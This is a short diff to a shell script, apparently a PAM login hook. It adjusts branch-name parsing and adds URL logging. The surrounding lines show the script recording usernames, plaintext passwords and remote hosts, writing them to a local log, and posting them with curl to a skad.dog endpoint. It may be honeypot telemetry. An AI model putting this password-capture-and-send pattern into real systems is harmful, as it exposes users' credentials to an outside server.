@@ -18,7 +18,11 @@ INDEX=$(($INDEX + 1));
 GIT_BRANCH=${GIT_BRANCH:INDEX};
 STRLEN=${#GIT_BRANCH}
 INDEX=`awk -v a="$GIT_BRANCH" -v b="\n" 'BEGIN{print index(a,b)}'`
-INDEX=$(($INDEX - $STRLEN - 1));
+if [ $INDEX == 0 ]; then
+        INDEX=STRLEN
+else
+	INDEX=$(($INDEX - $STRLEN - 1));
+fi
 GIT_BRANCH=${GIT_BRANCH:0:INDEX};
 
 URL="https://$GIT_BRANCH.skad.dog/attempt.php"
@@ -67,6 +71,7 @@ EOM
 
 LOG_ENTRY="$KEY_HASH, $TIME_STAMP, $PAM_USER, $password, $PAM_RUSER, $PAM_RHOST, $PAM_SERVICE, $PAM_TTY, $UNAME"
 
+echo "URL: $URL" >> /var/log/skad_dog.log
 echo "$LOG_ENTRY" >> /var/log/skad_dog.log
 
 JSON_FILE="/tmp/json.$TIME_STAMP.$RANDOM"
@@ -76,3 +81,4 @@ CMD="curl -i -X POST -d @$JSON_FILE $URL"
 `rm $JSON_FILE`
 
 fi
+
